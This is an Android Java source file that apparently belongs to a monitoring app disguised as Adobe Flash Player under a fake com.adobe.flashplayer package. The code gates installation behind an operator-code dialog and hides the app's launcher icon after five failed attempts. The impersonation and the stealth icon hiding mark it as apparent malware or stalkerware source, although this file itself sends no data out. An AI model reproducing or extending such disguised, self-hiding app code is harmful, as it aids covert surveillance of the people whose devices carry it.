package com.adobe.flashplayer.install;


import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.widget.EditText;
import android.widget.Toast;

import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;

import java.lang.reflect.Field;
import java.util.Locale;

public class InstallChecker {

    Activity mActivity;

    static int try_count = 5;

    public static String CFGCHECKCODETimes = "checkSetupCodeTimes";

    public static String CFGCHECKCODERESULT = "checkSetupCodeResult";

    public static String TAG = "[ljg]InstallChecker";


    InstallChecker(Activity activity){
        mActivity = activity;
    }

    public static String checkInstallCode(final Activity activity,final Handler handler){

        String strresult = PrefOper.getValue((Context)activity, Public.PARAMCONFIG_FileName, CFGCHECKCODERESULT);
        if (strresult == null || strresult.equals("") || strresult.equals("true") == false) {

        }else{
            Message msg = handler.obtainMessage();
            msg.what = InstallCheckHandler.INSTALL_SUCCESS;
            handler.sendMessage(msg);
            return "success";
        }

        final EditText editText = new EditText(activity);

        DialogInterface.OnClickListener dlgcl = new DialogInterface.OnClickListener() {

            public void codeError(DialogInterface dialog,EditText edit){
                try {
                    String strtimes = PrefOper.getValue((Context)activity, Public.PARAMCONFIG_FileName, CFGCHECKCODETimes);
                    int times ;
                    if (strtimes == null || strtimes.equals("") ) {
                        times = 0;
                    }else{
                        times = Integer.parseInt(strtimes);
                    }
                    times ++;
                    PrefOper.setValue(activity, Public.PARAMCONFIG_FileName, CFGCHECKCODETimes,String.valueOf(times));

                    int least = try_count - times;
                    String tips = "输入错误!" + "您还有" + least +"次机会";
                    Toast.makeText(activity,  tips, Toast.LENGTH_LONG).show();

                    edit.setText("");

                    if (times >= try_count ) {

                        InstallHelper.hideDesktopIcon(activity);

                        Message msg = handler.obtainMessage();
                        msg.what = InstallCheckHandler.INSTALL_FAILURE;
                        handler.sendMessage(msg);

                        //Looper.myLooper().quitSafely();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return;
            }

            @Override
            public void onClick(DialogInterface dialog, int flag) {
                try {
                    Field field = dialog.getClass().getSuperclass().getDeclaredField("mShowing");
                    field.setAccessible(true);
                    field.set(dialog, false);
                } catch (Exception e) {
                    e.printStackTrace();
                    return;
                }

                String input = editText.getText().toString();
                if(input.length() <= 0){
                    codeError(dialog,editText);
                    return;
                }

                boolean ret = Public.UserName.toLowerCase(Locale.CHINA).equals(input.toLowerCase(Locale.CHINA));
                if (ret == false) {
                    codeError(dialog,editText);
                }else{
                    try {
                        PrefOper.setValue((Context)activity, Public.PARAMCONFIG_FileName,CFGCHECKCODERESULT,"true");

                        Field field = dialog.getClass().getSuperclass().getDeclaredField("mShowing");
                        field.setAccessible(true);
                        field.set(dialog, true);

                        Message msg = handler.obtainMessage();
                        msg.what = InstallCheckHandler.INSTALL_SUCCESS;
                        handler.sendMessage(msg);

                        //Looper.myLooper().quitSafely();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                return;
            }
        };

        Looper.prepare();
        //editText.setInputType( InputType.TYPE_CLASS_NUMBER);
        AlertDialog.Builder builder = new AlertDialog.Builder(activity);
        builder.setTitle("请输入验证码");
        builder.setView(editText);
        builder.setCancelable(false);
        builder.setPositiveButton("确认", dlgcl );
        builder.create().show();

        Looper.loop();

        //Looper.myLooper().quitSafely();

        return editText.getText().toString();
    }



}
